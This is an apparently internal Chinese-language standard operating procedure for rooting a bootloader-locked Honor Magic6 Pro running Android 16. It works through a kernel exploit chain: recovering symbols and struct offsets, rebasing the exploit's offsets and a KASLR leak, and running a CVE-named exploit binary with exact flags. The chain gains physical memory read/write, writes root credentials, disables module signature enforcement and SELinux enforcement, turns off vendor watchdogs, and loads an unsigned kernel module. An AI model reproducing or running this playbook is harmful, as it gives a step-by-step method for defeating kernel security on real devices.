# BVL-AN16 端到端流程 SOP：从 boot 分析 → 提权 → 加载 KernelSU

> 依据：`ksu_root_bvl-an16-su/`（现役交付包）+ `bvl16_adapt/`（离线分析产物）+ `ksu_root_bvl-an16/`（源码层移植）
> 设备：荣耀 Magic6 Pro / BVL-AN16 · MagicOS 10.0.0.170(C00E170R202P8) · Android 16
> 内核：`6.1.157-android14-11-g7d3922fade43` · aarch64 GKI · **BL 锁定**
> 特征：**不刷机、不写任何分区**，每次开机靠漏洞打一发临时 root，重启即失效。

整条链路分两大段：**离线（boot 分析 + 重定位，只做一次）** 和 **在线（每 boot 打一发，每次开机都要跑）**。

---

## 全局铁律（先看这个）

| 铁律 | 原因 |
|---|---|
| **一个 boot 只打一发** | exploit 的写原语会扰动内核 PI 树，同一 boot 内第二发必崩（`run.lock` 用 boot_id 门控强制） |
| **先重启再打** | 命中率对 boot 新鲜度极度敏感：实测命中在 uptime≈168–171s，拖到 460s/873s 从未命中。驱动锁死 **95–300s** 窗口 |
| **不写任何分区** | BL 锁定，只写 `/data/local/tmp`；出问题重启即恢复 |
| **失败无副作用** | 未命中/半命中 panic 都不落盘，设备自动重启，驱动自动接下一轮 |
| **不要打开 KSU 管理器** | 打开约 10 秒触发整机挂死（模块 `faccessat` kprobe 在本机有缺陷）。不开则 root 长期稳定 |

---

# 第一段：离线 —— boot 分析（每台设备只做一次）

## 步骤 0 · 锁定"同一个构建"

```sh
adb shell uname -a        # 6.1.157-android14-11-g7d3922fade43 #1 SMP PREEMPT Wed May 20 10:38:51 UTC 2026
adb shell getprop ro.boot.flash.locked   # 1 = 锁定，走运行时路线，禁止刷写
```
拿到**同版本固件包**的 `boot.img`，**版本串 + 编译时间戳必须逐字一致**才算同一构建，否则后面所有偏移都是错的。

## 步骤 1 · 解包 boot.img → 裸内核 Image

| 子步 | 做法 | 产物 |
|---|---|---|
| 1.1 | `unpackbootimg` / `magiskboot unpack` / AIK 解出 kernel；v4 头要按 `page_size`(4096) 对齐 | `kernel`（可能是压缩的） |
| 1.2 | 检查魔数：`MZ`(4d5a 40fa) + `ARMd`(0x40 处) = arm64 裸 Image | — |
| 1.3 | 若是 gzip/lz4/zstd，先解压 | `kernel_bvl16.bin`（40,942,080 B） |

> 现役产物：`bvl16_adapt/kernel_bvl16.bin`

## 步骤 2 · 抽内核配置 IKCFG

从 Image 里搜 IKCFG 段解压 → `config_bvl16.txt`（215 KB）。必看四项：

| 配置项 | 本机值 | 影响 |
|---|---|---|
| `CONFIG_MODULE_SIG_FORCE` | y | 只能靠 exploit 翻转运行时 `sig_enforce` 布尔（sysfs 是只增型，清不掉） |
| `CONFIG_DEBUG_INFO_BTF_MODULES` | y | 有 BTF → 能取结构体布局 |
| `CONFIG_KALLSYMS_ALL` | y | local 符号也在 kallsyms 里 → 改名可行 |
| `CONFIG_TRIM_UNUSED_KSYMS` | y | 编译期未引用的导出符号被裁（**`commit_creds` 就是这么没的**） |

## 步骤 3 · 恢复 kallsyms（无源码时最关键的一步）

```sh
python bvl16_adapt/kallsyms_recover2.py kernel_bvl16.bin kallsyms_bvl16.txt
```
原理：定位 token 表 → marker 数组 → 名字区 → `kallsyms_num_syms` / `relative_base` → offsets 数组。
**验收**：`monotonic 116604/116604`，得到 **116,605 条符号**（`/proc/kallsyms` 未 root 时读不到，所以必须离线恢复）。

抽查关键符号必须齐全：`_text` `commit_creds` `prepare_creds` `init_task` `selinux_state` `kallsyms_lookup_name` `avc_has_perm` `sig_enforce` `sysctl_bootid`。

## 步骤 4 · 抽 BTF → 结构体布局

```sh
python bvl16_adapt/btf_parse.py kernel_bvl16.bin      # 在 Image 里直接搜 BTF magic 0xeb9f
```
拿到：`struct module` = 0x440；`task_struct` 字段 `real_cred 0x838 / cred 0x840 / comm 0x850`。

## 步骤 5 · （可选）Image → ELF

`bvl16_adapt/v2e`（vmlinux-to-elf）把裸 Image 还原成带符号的 ELF，用于反汇编定位硬编码常量（步骤 9 要用）。

## 步骤 6 · 静态判定 .ko 能否加载

```sh
python bvl16_adapt/ko_inspect.py kernelsu.ko      # vermagic / section sizes / UND 列表 / __versions / this_module size
```
必对四项：vermagic 串一致（`SMP preempt mod_unload modversions aarch64`）、`struct module` 0x440、`__versions` sh_size=0、`CONFIG_MODULE_SIG_FORCE` 需要 exploit 翻位。

---

# 第二段：离线 —— 重定位（把上游设备的常量换成本机）

| # | 对象 | 工具 | 本机结果 |
|---|---|---|---|
| 7 | .ko 未定义符号交叉校验 | `check_syms.py kallsyms_bvl16.txt ko_undefs.txt` | 221 个 UND，2 个解析不到 |
| 8 | 符号改名 | `ko_repoint_sym.py in.ko out.ko "__change_memory_common=change_memory_common" "commit_creds=override_creds"` | 与上游仅差 23 字节；改完 221/221 可解析 |
| 9 | exploit `target.h` 48 个内核偏移 | `make_target_h.py`（符号偏移取自 kallsyms，结构体字段取自 BTF） | 全部按本机重算 |
| 10 | exploit `p0_fingerprint.h` | `make_p0_fingerprint.py kernel_bvl16.bin` | 用本机 Image 重新生成 32 行指纹表 |
| 11 | `kaslr_leak` 烘焙偏移 | `patch_kaslr_leak.py` | `0x19cd94`(CGA) → `0x1141f8` = `worker_thread(0x113eb4)+0x344`，重编码 6 条指令 |
| 12 | 风险登记 | 人工 | `task_struct` 整体差 8 字节（模块里 ~20 处读 fs/files/signal/sighand 会错位） |

**步骤 8 的三条校验（缺一不可）**：消失的 = 改名的源；新增的 ⊆ 改名的目标；其余 219 个符号逐字节未变。
⚠️ 旧版改名脚本处理变长改名会挤乱 `.strtab`，把无关符号名弄成垃圾 —— 必须用 `ko_repoint_sym.py`（复用已有字符串 / 就地覆盖 + `\0` 填充）。

**步骤 11 的安全做法**：先用新算法重建 6 条指令，确认与出厂二进制**逐字节一致**，才允许落盘。

---

# 第三段：打包与自检

```sh
python run_ksu_bvl.py --check     # 校验 9 个必需载荷 + SHA256，不碰手机
```
载荷：`cve-2026-43499-bin-dc14`、`kernelsu_bvl.ko`(→kernelsu.ko)、`kaslr_leak`、`dc_ksu_run.sh`、`ksu_loader.sh`、`ksud`、`load_ko`、`magiskpolicy`、`ksu_rules`，可选 `tools/post_root.sh`。

---

# 第四段：在线 —— 每 boot 打一发（每次开机都要跑）

```
双击 一键root.bat            # 完整 KSU 模式，默认 6 轮
双击 一键root.bat noload     # NO_LOAD 稳定模式
python run_ksu_bvl.py --rounds 6 / --noload --rounds 3
```

## 步骤 13 · 取的干净内核态 + 进窗口

① `adb reboot` → ② 等 `sys.boot_completed=1` → ③ 轮询 `/proc/uptime`，进 **95–300s** 窗口才开打（等 boot 期分配器 churn 平息）。

## 步骤 14 · 一发制守卫

`dc_ksu_run.sh` 用 `/proc/sys/kernel/random/boot_id` 写 `run.lock`：同一个 boot 第二次调用直接 `ALREADY_RAN_THIS_BOOT` 退出。

## 步骤 15 · KASLR 泄漏

```sh
$RD/kaslr_leak | grep ^BASE=     # → BASE=0xffffffdf64600000
export KASLR_BASE=$KB            # 喂给 exploit，走 slide-kaslr-env-override 分支
```
失败 = `LEAK_FAIL`，直接重来。用两个独立 caller（`worker_thread+0x344`、`rcu_gp_fqs_loop+0x198`）交叉验证 slide。

## 步骤 16 · 打 exploit（一发）

```sh
export SLIDE_FORCE_PSELECT=1 KSNITCH_CPU=7 KASLR_BASE=$KB CFI_SKIP_VERIFY=1 CP_LOG=$RD/cp.log
export KSU_ACTIVATE=$RD/ksu_loader.sh
timeout 900 $RD/cve-2026-43499-bin-dc14
```
内部链路：**pselect 时序 shift → physrw 物理读写原语 → mm_struct 泄漏 → fops SKIP 旁路（本机 configfs 读回恒 0，必须 `CFI_SKIP_VERIFY=1`）→ `kptr_restrict` 清零 → 219 符号解析 → 写 cred 提权（uid 0 + full caps + sid=kernel）→ 翻 `sig_enforce=0` → 修 `random_table[4].data` → `selinux_state.enforcing=0` → exec `ksu_loader.sh`**。

## 步骤 17 · loader 以 uid 0 接管（顺序就是命）

| 序 | 动作 | 要点 |
|---|---|---|
| 1 | `kptr_restrict=0` | kallsyms 必须给真实地址，否则模块符号解析不到 |
| 1b/1c | **关 Honor 两道复位门控**：`bootfail` 的 `boot_detector_enabled=0`、`ro.sys.ping_bf_dorecovery`、BVL 专属 `core_hang_detect`、`hung_task_panic=0` | 这是"root 能活下来"的真正开关 |
| 1d–1f | 扫 exploit 自身地址空间的假 rb_node 毒化页 | 共享页污染会让同一签名的崩溃反复出现 |
| 2 | `hisecd` | 默认**不再冻结**（冻结后必须在所有退出路径解冻，否则 `adb reboot` 全部静默失效，只能物理断电） |
| 3 | 确认 `sig_enforce=0` | exploit 侧 pipe 写入已完成 |
| 4 | 快照 **pristine policy** | 注入任何规则之前先存原策略 |
| 5 | `magiskpolicy` 注入 `ksu_rules` | → Permissive |
| 6 | 组模块参数 `allow_shell=1 log_reboot=1 …` | — |
| 7 | `load_ko kernelsu.ko`（vermagic **flags-only** 比对） | 日志落 `loadko_result.log` |
| 7c | health check | 所有 `/proc/modules` 读取与 ksud 调用都套 `timeout`，防卡死 |
| 8 | `ksud` 四阶段 `post-fs-data / services / boot-completed / install` | 再布 `/dev/su`、`/system/bin/su`、allowlist 证据 |
| 8+ | `post_root.sh` hook（marker 门控，纯追加、默认空转） | NO_LOAD 模式下这是唯一干活的入口（uid 0 / `u:r:kernel:s0`） |
| 9 | 恢复 hardening knobs | — |
| 10 | **SELinux ENFORCE LAST** | 提前 enforce 会导致 root 进程无法写文件/exec；本机默认保持 Permissive |

## 步骤 18 · 判定

```sh
grep -c kernelsu /proc/modules     # ≥1 = 模块 Live
pidof ksud                         # 守护进程在
getenforce                         # Permissive
ls -l /system/bin/su               # 已部署
```
命中即停；未命中无副作用，驱动自动重启进下一轮。

---

# 第五段：失败分类与处置

| 末行特征 | 含义 | 处置 |
|---|---|---|
| `LEAK_FAIL` | KASLR 没泄漏成 | 重来（多为 boot 太旧/太新） |
| 干净 miss（无 panic） | exploit 未落地 | 重来，重启取新 boot |
| `CP main: before-slide-route` 后复位 | **半命中**：写原语阶段没落地 | 漏洞自身概率，重来 |
| `adb: error: closed` | 瞬断 | 驱动有 `dev_ok()` 反复确认后自动重连 |
| 命中后 1.5–4.5 分钟复位 | 模块 `kernelsu_init()` 病灶（判别实验已证实） | 改用 `--noload`；或回滚 `.orig.ko` |

**NO_LOAD 稳定模式**（只要 uid 0 窗口、不要 su 框架）：提权 + 注入策略后**不加载模块** → 实测 430s+ 连续采样无复位、Permissive 全程保持；root 任务写进 `tools/post_root.sh`（推到 `/data/local/tmp/ksu/post_root.sh`），loader 末尾自动以 uid 0 执行。判定证据：`ksu_load.log` 出现 `module NOT loaded`。

---

# 附：一句话版本的流水线

```
boot.img → 解包 Image → IKCFG/config → kallsyms(116605) → BTF(结构体)
   → 符号校验 → .ko 改名 → target.h 重算 → p0 指纹 → kaslr_leak 重编码
   → 打包自检 → 每 boot：reboot → 95~300s 窗口 → 一发 → KASLR → physrw → 提权
   → 关门控 → 注策略(Permissive) → load_ko → ksud → su 就位 → 判定
```

# 红线与回滚

1. 全程不写分区，BL 保持锁定；
2. `kernelsu_bvl.orig.ko` 是回滚锚点 —— 现役 `kernelsu_bvl.ko` 打了 8 字节 `faccessat` 补丁（`movz x0,#0; ret`，摘掉"app 探 su 路径即挂死"的雷），尚在验证，异常就用 `.orig.ko` 覆盖回去；
3. 临时 root 重启即失效，一切 root 级服务（含 Shizuku 类）都要在命中窗口内重新部署；
4. 详尽技术细节见：`BVL-AN16-最终报告.md`（病灶定位）、`BVL-AN16-崩溃定位-第二轮.md`、`BVL-AN16-真凶定位-第三轮.md`、`管理器挂死-复现与定位.md`、`KO_SYMBOL_NOTES.txt`。
